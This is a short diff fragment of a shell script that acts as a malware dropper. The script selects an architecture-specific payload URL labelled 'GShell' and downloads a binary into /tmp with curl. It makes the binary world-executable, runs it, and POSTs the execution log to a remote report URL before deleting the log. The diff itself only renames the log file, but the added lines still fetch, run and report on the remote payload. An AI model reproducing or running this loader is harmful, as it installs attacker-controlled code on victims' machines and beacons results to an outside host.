@@ -19,13 +19,13 @@ else
     pl_url=$i386_url
     curl -X POST $report_url -d "GShell_i386"
 fi 
-curl -o /tmp/gshell71085644.bin $pl_url 1>/tmp/tmplog042323.log 2>&1
+curl -o /tmp/gshell71085644.bin $pl_url 1>/tmp/tmplog0423231.log 2>&1
 runCount2=$(ps -ef|grep gshell71085644.bin | grep -v grep -c)
 if [ $runCount2 != 0 ];then
     echo "exit"
     exit
 fi
-chmod 777 /tmp/gshell71085644.bin 1>>/tmp/tmplog042323.log 2>&1
-/tmp/gshell71085644.bin 1>>/tmp/tmplog042323.log 2>&1
-curl -X POST $report_url -d @/tmp/tmplog042323.log
-rm /tmp/tmplog042323.log
+chmod 777 /tmp/gshell71085644.bin 1>>/tmp/tmplog0423231.log 2>&1
+/tmp/gshell71085644.bin 1>>/tmp/tmplog0423231.log 2>&1
+curl -X POST $report_url -d @/tmp/tmplog0423231.log
+rm /tmp/tmplog0423231.log
